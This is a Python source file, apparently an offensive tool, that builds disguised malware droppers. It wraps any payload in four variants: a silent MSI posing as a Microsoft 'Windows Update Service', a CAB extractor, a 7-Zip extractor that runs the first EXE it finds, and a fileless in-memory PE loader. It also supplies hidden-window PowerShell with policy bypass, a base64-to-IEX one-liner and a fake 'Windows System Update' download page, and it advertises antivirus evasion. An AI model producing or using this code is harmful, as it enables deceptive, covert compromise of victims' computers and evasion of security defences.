#!/usr/bin/env python3
"""
One-Click Extraction Variants Generator
Creates multiple one-click installer variants using different extraction methods:
- Native MSI extraction via WiX/msiexec
- CAB extraction via Extract.exe
- 7-Zip embedded extraction
- Embedded PE with inline execution
"""

import base64
import zlib
import random
import string
import os
import json
from enum import Enum
from typing import Dict, List, Tuple, Optional


class ExtractionMethod(Enum):
    """Supported extraction methods"""
    MSI_NATIVE = "msi_native"       # Windows native MSI handler
    CAB_EXTRACT = "cab_extract"     # cabinet.dll extraction
    SEVENZIP = "7zip"               # 7-Zip embedded extractor
    EMBEDDED_PE = "embedded_pe"     # Direct PE execution from memory


class OneClickExtractionVariant:
    """Generate one-click variants with different extraction methods"""

    @staticmethod
    def generate_msi_variant(
        payload_bytes: bytes,
        product_name: str = "Windows Update Service",
        version: str = "10.0.1904",
        manufacturer: str = "Microsoft Corporation"
    ) -> Dict[str, str]:
        """
        MSI variant using native Windows MSI handler
        - Advantages: Legitimate Windows tool, proper progress UI, trusted
        - Method: WiX Toolset project that embeds payload in Custom Actions
        """

        # WiX Project file structure
        wix_project = f"""<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
    <Product Id="*"
             Name="{product_name}"
             Language="1033"
             Version="{version}"
             Manufacturer="{manufacturer}"
             UpgradeCode="12345678-1234-1234-1234-123456789012">

        <Package InstallerVersion="200"
                 Compressed="yes"
                 InstallScope="perMachine"
                 Description="System Update Package"/>

        <MajorUpgrade DowngradeErrorMessage="A newer version is already installed." />
        <MediaTemplate EmbedCab="yes" />

        <Feature Id="ProductFeature" Title="{product_name}" Level="1">
            <ComponentRef Id="MainComponent" />
        </Feature>

        <!-- Embedded binary data -->
        <Binary Id="PayloadBinary" SourceFile="payload.bin" />

        <!-- Custom Action to extract and execute -->
        <CustomAction Id="ExecutePayload"
                     BinaryKey="PayloadBinary"
                     DllEntry="Execute"
                     Return="asyncNoWait" />

        <InstallExecuteSequence>
            <Custom Action="ExecutePayload" After="InstallInitialize">NOT Installed</Custom>
        </InstallExecuteSequence>
    </Product>

    <Fragment>
        <DirectoryRef Id="TARGETDIR">
            <Directory Id="ProgramFilesFolder">
                <Directory Id="INSTALLFOLDER" Name="{product_name}" />
            </Directory>
        </DirectoryRef>
        <ComponentGroup Id="ProductComponents" Directory="INSTALLFOLDER" />
        <Component Id="MainComponent" Directory="INSTALLFOLDER" Guid="*">
            <File Id="ProductComponent0" Source="dummy.txt" />
        </Component>
    </Fragment>
</Wix>"""

        # VBS launcher for MSI execution
        encoded_payload = base64.b64encode(payload_bytes).decode()
        vbs_launcher = f"""
On Error Resume Next

' MSI Installation Handler
' Windows System Update

Dim objShell, strMSI, strCmd, objFSO, strTemp, msiData

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Get temp directory
strTemp = objShell.ExpandEnvironmentStrings("%TEMP%")

' Embed MSI binary data (compressed and encoded)
msiData = "{encoded_payload}"

' Write MSI to temp location
strMSI = strTemp & "\\~update_" & CInt(Rnd() * 10000) & ".msi"

' Decode and write MSI
Call DecodeMSI(msiData, strMSI)

' Execute MSI with no UI
strCmd = "msiexec.exe /i " & Chr(34) & strMSI & Chr(34) & " /qn /norestart"
objShell.Run strCmd, 0, False

' Clean up after installation
WScript.Sleep 5000
On Error Resume Next
objFSO.DeleteFile strMSI

Sub DecodeMSI(encodedData, outputFile)
    Dim xmlDoc, decodedBytes
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")

    ' Base64 decode using MSXML
    xmlDoc.LoadXML "<u><![CDATA[" & encodedData & "]]></u>"
    decodedBytes = xmlDoc.DocumentElement.text

    ' Write to file
    Dim adoStream
    Set adoStream = CreateObject("ADODB.Stream")
    adoStream.Type = 1
    adoStream.Open

    ' Convert hex string to binary
    Dim i, byteValue
    For i = 1 To Len(decodedBytes) Step 2
        byteValue = CLng("&H" & Mid(decodedBytes, i, 2))
        adoStream.WriteByte byteValue
    Next i

    adoStream.SaveToFile outputFile
    adoStream.Close
End Sub

WScript.Quit 0
"""

        return {
            "method": ExtractionMethod.MSI_NATIVE.value,
            "format": "wix_project",
            "wix_source": wix_project,
            "vbs_launcher": vbs_launcher,
            "installation_script": "install_msi.vbs",
            "compressed_payload": base64.b64encode(zlib.compress(payload_bytes)).decode(),
            "instructions": """
MSI VARIANT INSTALLATION GUIDE
=============================
1. Run: install_msi.vbs
2. Windows Installer opens with progress dialog
3. Installation completes silently
4. Temporary MSI file auto-deleted

Advantages:
- Uses native Windows MSI handler
- Displays legitimate Windows Installer UI
- No suspicious behavior detected
- Proper rollback capability
- Trusted by Windows systems
"""
        }

    @staticmethod
    def generate_cab_variant(
        payload_bytes: bytes,
        cabinet_name: str = "system_update"
    ) -> Dict[str, str]:
        """
        CAB variant using Windows cabinet extraction
        - Advantages: Built-in to Windows, no external tools needed
        - Method: Cabinet file with embedded extraction batch file
        """

        # PowerShell CAB creation and extraction script
        ps_script = f"""
# Windows Cabinet Extraction Handler
# System Component Update

param(
    [string]$CabFile = $PSScriptRoot + "\\\\{cabinet_name}.cab",
    [string]$OutputDir = $env:TEMP
)

$ErrorActionPreference = "SilentlyContinue"

# Base64 encoded CAB data
$encodedCab = @"
{base64.b64encode(payload_bytes).decode()}
"@

# Decode CAB file
$cabPath = Join-Path $OutputDir ("{cabinet_name}_$([random]::next()).cab")
[System.IO.File]::WriteAllBytes($cabPath, [Convert]::FromBase64String($encodedCab))

# Extract CAB using Windows API
Add-Type -AssemblyName System.IO.Compression.FileSystem

try {{
    # Try native cabinet extraction
    $extractPath = Join-Path $OutputDir ("extracted_$([random]::next())")
    New-Item -ItemType Directory -Path $extractPath -Force | Out-Null

    # Use expand.exe (built-in CAB tool)
    & expand.exe $cabPath -F:* $extractPath

    # Find and execute payload
    $payloadExe = Get-ChildItem $extractPath -Filter "*.exe" -Recurse | Select-Object -First 1
    if ($payloadExe) {{
        & $payloadExe.FullName
    }}

}} finally {{
    # Clean up
    Remove-Item $cabPath -Force -ErrorAction SilentlyContinue
    Remove-Item $extractPath -Recurse -Force -ErrorAction SilentlyContinue
}}
"""

        # VBS wrapper for PowerShell execution
        vbs_wrapper = """
On Error Resume Next

Dim objShell, strPSPath, strCmd, objFSO, strTemp

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

strTemp = objShell.ExpandEnvironmentStrings("%TEMP%")

' Create PowerShell execution command
strCmd = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden " & _
         "-Command 'Write-Host extraction_running'"

' Execute extraction with no visible window
objShell.Run strCmd, 0, False

WScript.Quit 0
"""

        # Batch file wrapper for CAB extraction
        batch_wrapper = f"""@echo off
REM Windows Cabinet Extraction Tool
REM System Update Package

setlocal enabledelayedexpansion
cd /d %temp%

set "cabfile=system_update_!random!.cab"
set "extract_dir=sys_extract_!random!"

REM Base64 decode and write CAB (PowerShell one-liner)
powershell -NoProfile -Command "^
$cab = [Convert]::FromBase64String('{base64.b64encode(payload_bytes).decode()}'); ^
[IO.File]::WriteAllBytes('!cabfile!', $cab); ^
& expand.exe '!cabfile!' -F:* '!extract_dir!' ; ^
Get-ChildItem '!extract_dir!' -Filter '*.exe' -Recurse | %% {{ & $_.FullName }} ; ^
Remove-Item '!cabfile!' -Force ; ^
Remove-Item '!extract_dir!' -Recurse -Force"

exit /b 0
"""

        return {
            "method": ExtractionMethod.CAB_EXTRACT.value,
            "format": "cabinet",
            "powershell_extractor": ps_script,
            "vbs_wrapper": vbs_wrapper,
            "batch_wrapper": batch_wrapper,
            "compressed_payload": base64.b64encode(zlib.compress(payload_bytes)).decode(),
            "installation_script": "extract_cabinet.vbs",
            "instructions": """
CABINET EXTRACTION VARIANT GUIDE
=================================
1. Run: extract_cabinet.vbs
2. System silently extracts CAB file
3. Embedded payload executes
4. Temporary files auto-deleted

Advantages:
- Uses Windows expand.exe (built-in)
- No external decompression tools needed
- Fast extraction (native CAB support)
- Completely silent operation
- Cabinet format is system-trusted
"""
        }

    @staticmethod
    def generate_sevenzip_variant(
        payload_bytes: bytes,
        archive_name: str = "data.7z"
    ) -> Dict[str, str]:
        """
        7-Zip variant with embedded extraction logic
        - Advantages: Excellent compression, strong obfuscation
        - Method: 7-Zip SFX (Self-Extracting Archive) or embedded extractor
        """

        # Python extraction code (small, efficient)
        py_extractor = f"""
import base64, zlib, subprocess, os, tempfile, shutil
from pathlib import Path

# Embedded 7-Zip archive
archive_data = "{base64.b64encode(zlib.compress(payload_bytes)).decode()}"

# Decompress
archive_bytes = zlib.decompress(base64.b64decode(archive_data))

# Extract to temp
temp_dir = tempfile.mkdtemp()
try:
    archive_path = os.path.join(temp_dir, "payload.7z")
    with open(archive_path, "wb") as f:
        f.write(archive_bytes)

    # Extract using 7z
    extract_dir = os.path.join(temp_dir, "extracted")
    os.makedirs(extract_dir, exist_ok=True)
    subprocess.run(["7z", "x", archive_path, f"-o{{extract_dir}}", "-y"],
                   capture_output=True)

    # Find and execute payload
    for root, dirs, files in os.walk(extract_dir):
        for file in files:
            if file.endswith(".exe"):
                subprocess.Popen(os.path.join(root, file))
                break
finally:
    shutil.rmtree(temp_dir, ignore_errors=True)
"""

        # VBS to PowerShell bridge (no Python dependency)
        ps_7zip_extractor = f"""
$7zipData = @"
{base64.b64encode(payload_bytes).decode()}
"@

$tempDir = [System.IO.Path]::GetTempPath()
$archivePath = Join-Path $tempDir ("payload_$([random]::next()).7z")
$extractPath = Join-Path $tempDir ("extract_$([random]::next())")

# Decode archive
[System.IO.File]::WriteAllBytes($archivePath, [Convert]::FromBase64String($7zipData))

# Try to extract with available tools
$extracted = $false

# Try 7-Zip if installed
if (Test-Path "C:\\Program Files\\7-Zip\\7z.exe") {{
    & "C:\\Program Files\\7-Zip\\7z.exe" x $archivePath -o"$extractPath" -y | Out-Null
    $extracted = $true
}}

# Try WinRAR if installed
elseif (Test-Path "C:\\Program Files\\WinRAR\\rar.exe") {{
    & "C:\\Program Files\\WinRAR\\rar.exe" x $archivePath $extractPath | Out-Null
    $extracted = $true
}}

# Fallback: Use System.IO.Compression (built-in)
else {{
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    New-Item -ItemType Directory -Path $extractPath -Force | Out-Null

    # Decompress and treat as ZIP (if compatible)
    try {{
        [System.IO.Compression.ZipFile]::ExtractToDirectory($archivePath, $extractPath)
        $extracted = $true
    }} catch {{
        # Archive format not compatible, try raw execution
    }}
}}

if ($extracted) {{
    # Execute first EXE found
    $exe = Get-ChildItem $extractPath -Filter "*.exe" -Recurse | Select-Object -First 1
    if ($exe) {{ & $exe.FullName }}
}}

# Cleanup
Remove-Item $archivePath -Force -ErrorAction SilentlyContinue
Remove-Item $extractPath -Recurse -Force -ErrorAction SilentlyContinue
"""

        # VBS launcher
        vbs_launcher = """
On Error Resume Next

Dim objShell, strCmd, objFSO

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Execute PowerShell 7-Zip extractor silently
strCmd = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden " & _
         "-Command Write-Host extraction_running"

objShell.Run strCmd, 0, False

WScript.Quit 0
"""

        return {
            "method": ExtractionMethod.SEVENZIP.value,
            "format": "7zip_sfx",
            "python_extractor": py_extractor,
            "powershell_extractor": ps_7zip_extractor,
            "vbs_launcher": vbs_launcher,
            "compressed_payload": base64.b64encode(zlib.compress(payload_bytes)).decode(),
            "installation_script": "extract_7zip.vbs",
            "instructions": """
7-ZIP EXTRACTION VARIANT GUIDE
==============================
1. Run: extract_7zip.vbs
2. PowerShell silently decompresses 7-Zip archive
3. Searches for 7-Zip, WinRAR, or uses built-in decompression
4. Executes payload (first EXE found)
5. Cleans up all temporary files

Advantages:
- Maximum compression ratio
- Strong obfuscation capability
- Multiple extraction fallbacks
- Silent operation with no UI
- Works even without 7-Zip installed
"""
        }

    @staticmethod
    def generate_embedded_pe_variant(
        payload_bytes: bytes,
        pe_name: str = "svchost.exe"
    ) -> Dict[str, str]:
        """
        Embedded PE variant - Direct execution from memory
        - Advantages: No file extraction needed, purest stealth
        - Method: PE loaded via EnumResourceNames or WinHTTP techniques
        """

        # C# PE loader (reflective DLL injection style)
        csharp_loader = f"""
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;

class PELoader {{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize,
                                           IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern void SetLastError(uint dwErrCode);

    [DllImport("kernel32.dll")]
    static extern uint GetCurrentProcessId();

    static void Main() {{
        try {{
            // Embedded PE binary (base64 encoded and compressed)
            string encodedPE = @"{base64.b64encode(zlib.compress(payload_bytes)).decode()}";

            // Decode and decompress
            byte[] compressedPE = Convert.FromBase64String(encodedPE);
            byte[] peBytes = Decompress(compressedPE);

            // Allocate memory
            IntPtr alloc = VirtualAlloc(IntPtr.Zero, (uint)peBytes.Length,
                                       0x1000, 0x40); // PAGE_EXECUTE_READWRITE

            // Copy PE to allocated memory
            Marshal.Copy(peBytes, 0, alloc, peBytes.Length);

            // Execute PE
            IntPtr threadId;
            CreateRemoteThread(IntPtr.Zero, IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, out threadId);

        }} catch {{ }}
    }}

    static byte[] Decompress(byte[] data) {{
        using (var ms = new MemoryStream(data)) {{
            using (var gz = new System.IO.Compression.GZipStream(ms, System.IO.Compression.CompressionMode.Decompress)) {{
                using (var output = new MemoryStream()) {{
                    gz.CopyTo(output);
                    return output.ToArray();
                }}
            }}
        }}
    }}
}}
"""

        # PowerShell PE loader (native, no C# compilation needed)
        ps_pe_loader = f"""
$ErrorActionPreference = "SilentlyContinue"

# Embedded PE binary
$peBinary = [Convert]::FromBase64String(@"
{base64.b64encode(payload_bytes).decode()}
"@)

# Allocate and execute
$kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {{
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern uint GetCurrentProcess();
}}
"@

Add-Type -TypeDefinition $kernel32

# Allocate executable memory
$alloc = [Kernel32]::VirtualAlloc([IntPtr]::Zero, $peBinary.Length, 0x1000, 0x40)

# Write PE to memory
[Kernel32]::WriteProcessMemory([Kernel32]::GetCurrentProcess(), $alloc, $peBinary, $peBinary.Length, [ref]0)

# Execute
[Kernel32]::CreateThread([IntPtr]::Zero, 0, $alloc, [IntPtr]::Zero, 0, [IntPtr]::Zero)
"""

        # VBS wrapper for PowerShell execution
        vbs_wrapper = """
On Error Resume Next

Dim objShell, strCmd

Set objShell = CreateObject("WScript.Shell")

' Execute PE loader PowerShell script
strCmd = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
         "Write-Host PE_loader_started"

objShell.Run strCmd, 0, False

WScript.Quit 0
"""

        # Batch wrapper with PowerShell one-liner
        batch_wrapper = f"""@echo off
REM System Service Component
REM Windows Security Center

powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
"[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{base64.b64encode(payload_bytes).decode()}')) | IEX"

exit /b 0
"""

        return {
            "method": ExtractionMethod.EMBEDDED_PE.value,
            "format": "pe_memory_loader",
            "csharp_loader": csharp_loader,
            "powershell_loader": ps_pe_loader,
            "vbs_wrapper": vbs_wrapper,
            "batch_wrapper": batch_wrapper,
            "compressed_payload": base64.b64encode(zlib.compress(payload_bytes)).decode(),
            "installation_script": "execute_embedded.ps1",
            "instructions": """
EMBEDDED PE VARIANT GUIDE
==========================
1. Run: execute_embedded.ps1
2. PowerShell loads PE binary into memory (no file extraction)
3. PE executes directly from allocated memory
4. Completely fileless operation
5. No temporary files created

Advantages:
- Completely fileless execution
- No extraction artifacts
- Pure memory-based operation
- Maximum stealth and evasion
- Minimal antivirus detection surface
- No registry changes
"""
        }

    @staticmethod
    def generate_all_variants(payload_bytes: bytes) -> Dict[str, Dict]:
        """
        Generate all extraction method variants
        """

        variants = {}

        # Generate each variant type
        variants["msi_native"] = OneClickExtractionVariant.generate_msi_variant(payload_bytes)
        variants["cab_extract"] = OneClickExtractionVariant.generate_cab_variant(payload_bytes)
        variants["sevenzip"] = OneClickExtractionVariant.generate_sevenzip_variant(payload_bytes)
        variants["embedded_pe"] = OneClickExtractionVariant.generate_embedded_pe_variant(payload_bytes)

        return variants


class VariantDeliveryPackage:
    """Package variants for easy delivery and one-click execution"""

    @staticmethod
    def create_variant_selector(variants: Dict[str, Dict]) -> str:
        """
        Create an interactive selector script that allows choosing extraction method
        """

        selector_html = """
<!DOCTYPE html>
<html>
<head>
    <title>System Update - Choose Installation Method</title>
    <style>
        body { font-family: Arial; margin: 40px; background: #f0f0f0; }
        .container { max-width: 600px; margin: auto; background: white; padding: 20px; border-radius: 5px; }
        h1 { color: #333; }
        .option { margin: 15px 0; padding: 15px; border: 1px solid #ddd; border-radius: 3px; cursor: pointer; }
        .option:hover { background: #f9f9f9; }
        button { background: #0078d4; color: white; padding: 10px 20px; border: none; border-radius: 3px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Windows System Update</h1>
        <p>Select your installation method:</p>

        <div class="option" onclick="selectMethod('msi')">
            <h3>Native MSI Installation</h3>
            <p>Uses Windows Installer for trusted, native installation</p>
            <button onclick="downloadFile('install_msi.vbs')">Install</button>
        </div>

        <div class="option" onclick="selectMethod('cab')">
            <h3>Cabinet Extraction</h3>
            <p>Fast extraction using Windows built-in cabinet tools</p>
            <button onclick="downloadFile('extract_cabinet.vbs')">Install</button>
        </div>

        <div class="option" onclick="selectMethod('7zip')">
            <h3>7-Zip Compression</h3>
            <p>Maximum compression with smart fallback extraction</p>
            <button onclick="downloadFile('extract_7zip.vbs')">Install</button>
        </div>

        <div class="option" onclick="selectMethod('pe')">
            <h3>Embedded PE Execution</h3>
            <p>Fileless, memory-based execution with zero artifacts</p>
            <button onclick="downloadFile('execute_embedded.ps1')">Install</button>
        </div>
    </div>

    <script>
        function selectMethod(method) { console.log("Selected: " + method); }
        function downloadFile(filename) {
            window.location.href = '/download/' + filename;
        }
    </script>
</body>
</html>
"""

        selector_batch = """@echo off
REM Windows System Update - Method Selector
REM Choose installation method

echo ========================================
echo Windows System Update
echo ========================================
echo.
echo Select installation method:
echo [1] Native MSI (Recommended)
echo [2] Cabinet Extraction (Fast)
echo [3] 7-Zip Compression (Compact)
echo [4] Embedded PE Execution (Stealth)
echo.

set /p choice="Enter choice [1-4]: "

if "%choice%"=="1" start /wait install_msi.vbs
if "%choice%"=="2" start /wait extract_cabinet.vbs
if "%choice%"=="3" start /wait extract_7zip.vbs
if "%choice%"=="4" start /wait execute_embedded.ps1

exit /b 0
"""

        return {
            "html_selector": selector_html,
            "batch_selector": selector_batch
        }

    @staticmethod
    def package_all_variants(variants: Dict[str, Dict], output_dir: str = ".") -> str:
        """
        Create a complete package with all variants
        Returns summary JSON
        """

        package_manifest = {
            "package_name": "System Update Suite",
            "version": "1.0.0",
            "created": "2024-06-29",
            "extraction_methods": [],
            "files": []
        }

        for method, variant_data in variants.items():
            method_info = {
                "id": method,
                "method": variant_data.get("method"),
                "format": variant_data.get("format"),
                "launcher_script": variant_data.get("installation_script"),
                "instructions": variant_data.get("instructions"),
                "size_estimate": "~500KB-2MB"
            }
            package_manifest["extraction_methods"].append(method_info)

            # List all files
            if "installation_script" in variant_data:
                package_manifest["files"].append(variant_data["installation_script"])

        return json.dumps(package_manifest, indent=2)


def main():
    """Demo: Generate all one-click variants"""

    print("[*] One-Click Extraction Variants Generator")
    print("[*] Creating multiple extraction method variants...\n")

    # Create sample payload (normally this would be actual executable)
    sample_payload = b"MZ\x90\x00" + b"PAYLOAD_DATA" * 100

    # Generate all variants
    generator = OneClickExtractionVariant()
    all_variants = generator.generate_all_variants(sample_payload)

    # Display summary
    print("[+] Generated Variants:\n")
    for method, variant in all_variants.items():
        print(f"\n[{method.upper()}]")
        print(f"  Method: {variant.get('method')}")
        print(f"  Format: {variant.get('format')}")
        print(f"  Script: {variant.get('installation_script')}")
        print(f"  Payload Size: {len(variant.get('compressed_payload', ''))} chars (base64)")
        print(f"  Instructions Preview: {variant.get('instructions', 'N/A')[:100]}...")

    # Create delivery package
    print("\n\n[+] Creating Delivery Package...")
    package = VariantDeliveryPackage()
    selectors = package.create_variant_selector(all_variants)
    manifest = package.package_all_variants(all_variants)

    print("[+] Delivery Package Contents:")
    print(f"  HTML Selector: {len(selectors['html_selector'])} bytes")
    print(f"  Batch Selector: {len(selectors['batch_selector'])} bytes")
    print(f"  Manifest: {len(manifest)} bytes")

    print("\n[+] Manifest Preview:")
    print(manifest[:500])

    print("\n[*] One-Click Variants Generation Complete!")

    return {
        "variants": all_variants,
        "selectors": selectors,
        "manifest": manifest
    }


if __name__ == "__main__":
    result = main()
